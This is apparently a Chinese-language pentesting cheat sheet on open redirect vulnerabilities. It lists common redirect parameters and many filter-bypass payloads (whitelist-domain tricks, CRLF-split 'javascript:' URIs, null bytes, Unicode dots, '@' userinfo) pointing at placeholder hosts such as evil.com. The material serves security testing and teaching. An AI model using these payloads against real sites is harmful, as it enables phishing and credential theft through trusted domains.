[原文文档](README.en.md)

# 开放URL重定向

> 当Web应用程序接受可能导致Web应用程序重定向请求到包含在不受信任输入中的URL的不受信任输入时，可能发生未验证的重定向和转发。通过修改不受信任的URL输入为恶意站点，攻击者可能成功发起钓鱼诈骗并窃取用户凭据。由于修改后的链接中的服务器名称与原始站点相同，钓鱼尝试可能具有更值得信赖的外观。未验证的重定向和转发攻击也可用于恶意制作通过应用程序访问控制检查然后将攻击者转发到他们通常无法访问的特权功能的URL。

## 摘要

* [方法论](#methodology)
    * [HTTP重定向状态码](#http-redirection-status-code)
    * [重定向方法](#redirect-methods)
        * [基于路径的重定向](#path-based-redirects)
        * [基于JavaScript的重定向](#javascript-based-redirects)
        * [常见查询参数](#common-query-parameters)
    * [过滤器绕过](#filter-bypass)
* [实验环境](#labs)
* [参考资料](#references)

## 方法论

当Web应用程序或服务器使用未验证的、用户提供的输入来重定向用户到其他站点时，就会发生开放重定向漏洞。这允许攻击者制作一个指向易受攻击站点的链接，该链接重定向到他们选择的恶意站点。

攻击者可以利用此漏洞进行钓鱼活动、窃取会话或强制用户未经同意执行操作。

**示例**：一个Web应用程序有一个功能，允许用户点击链接并自动重定向到保存的首选主页。这可能像这样实现：

```ps1
https://example.com/redirect?url=https://userpreferredsite.com
```

攻击者可以通过将`userpreferredsite.com`替换为指向恶意网站的链接来利用这里的开放重定向。然后他们可以在钓鱼电子邮件或另一个网站上分发此链接。当用户点击链接时，他们会被带到恶意网站。

## HTTP重定向状态码

HTTP重定向状态码，以3开头的，表示客户端必须采取额外操作来完成请求。以下是一些最常见的：

* [300 多种选择](https://httpstatuses.com/300) - 这表示请求有多个可能的响应。客户端应该选择其中一个。
* [301 永久移动](https://httpstatuses.com/301) - 这意味着请求的资源已永久移动到Location头中给出的URL。所有未来请求都应使用新的URI。
* [302 发现](https://httpstatuses.com/302) - 此响应代码意味着请求的资源已临时移动到Location头中给出的URL。与301不同，它并不意味着资源已永久移动，只是它临时位于其他地方。
* [303 查看其他](https://httpstatuses.com/303) - 服务器发送此响应以指示客户端使用GET请求在另一个URI处获取请求的资源。
* [304 未修改](https://httpstatuses.com/304) - 这用于缓存目的。它告诉客户端响应未被修改，因此客户端可以继续使用相同缓存的响应版本。
* [305 使用代理](https://httpstatuses.com/305) - 请求的资源必须通过Location头中提供的代理访问。
* [307 临时重定向](https://httpstatuses.com/307) - 这意味着请求的资源已临时移动到Location头中给出的URL，未来请求仍应使用原始URI。
* [308 永久重定向](https://httpstatuses.com/308) - 这意味着资源已永久移动到Location头中给出的URL，未来请求应使用新的URI。它类似于301，但不允许HTTP方法更改。

## 重定向方法

### 基于路径的重定向

重定向逻辑可能依赖于路径而不是查询参数：

* 在URL中使用斜杠：`https://example.com/redirect/http://malicious.com`

* 注入相对路径：`https://example.com/redirect/../http://malicious.com`

### 基于JavaScript的重定向

如果应用程序使用JavaScript进行重定向，攻击者可能操作脚本变量：

**示例**：

```js
var redirectTo = "http://trusted.com";
window.location = redirectTo;
```

**载荷**：`?redirectTo=http://malicious.com`

### 常见查询参数

```powershell
?checkout_url={payload}
?continue={payload}
?dest={payload}
?destination={payload}
?go={payload}
?image_url={payload}
?next={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
?return_path={payload}
?return_to={payload}
?return={payload}
?returnTo={payload}
?rurl={payload}
?target={payload}
?url={payload}
?view={payload}
/{payload}
/redirect/{payload}
```

## 过滤器绕过

* 使用列入白名单的域名或关键字

    ```powershell
    www.whitelisted.com.evil.com 重定向到 evil.com
    ```

* 使用**CRLF**绕过"javascript"黑名单关键字

    ```powershell
    java%0d%0ascript%0d%0a:alert(0)
    ```

* 使用"`//`"和"`////`"绕过"http"黑名单关键字

    ```powershell
    //google.com
    ////google.com
    ```

* 使用"https:"绕过"`//`"黑名单关键字

    ```powershell
    https:google.com
    ```

* 使用"`\/\/`"绕过"`//`"黑名单关键字

    ```powershell
    \/\/google.com/
    /\/google.com/
    ```

* 使用"`%E3%80%82`"绕过"."黑名单字符

    ```powershell
    /?redir=google。com
    //google%E3%80%82com
    ```

* 使用空字节"`%00`"绕过黑名单过滤器

    ```powershell
    //google%00.com
    ```

* 使用HTTP参数污染

    ```powershell
    ?next=whitelisted.com&next=google.com
    ```

* 使用"@"字符。[常见Internet方案语法](https://datatracker.ietf.org/doc/html/rfc1738)

    ```powershell
    //<user>:<password>@<host>:<port>/<url-path>
    http://www.theirsite.com@yoursite.com/
    ```

* 创建文件夹作为他们的域名

    ```powershell
    http://www.yoursite.com/http://www.theirsite.com/
    http://www.yoursite.com/folder/www.folder.com
    ```

* 使用"?"字符，浏览器会将其翻译为"`/?`"

    ```powershell
    http://www.yoursite.com?http://www.theirsite.com/
    http://www.yoursite.com?folder/www.folder.com
    ```

* 主机/分割Unicode规范化

    ```powershell
    https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
    http://a.com／X.b.com
    ```

## 实验环境

* [Root Me - HTTP - 开放重定向](https://www.root-me.org/fr/Challenges/Web-Serveur/HTTP-Open-redirect)
* [PortSwigger - 基于DOM的开放重定向](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)

## 参考资料

* [Host/Split Exploitable Antipatterns in Unicode Normalization - Jonathan Birch - August 3, 2019](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)
* [Open Redirect Cheat Sheet - PentesterLand - November 2, 2018](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
* [Open Redirect Vulnerability - s0cket7 - August 15, 2018](https://s0cket7.com/open-redirect-vulnerability/)
* [Open-Redirect-Payloads - Predrag Cujanović - April 24, 2017](https://github.com/cujanovic/Open-Redirect-Payloads)
* [Unvalidated Redirects and Forwards Cheat Sheet - OWASP - February 28, 2024](https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
* [You do not need to run 80 reconnaissance tools to get access to user accounts - Stefano Vettorazzi (@stefanocoding) - May 16, 2019](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)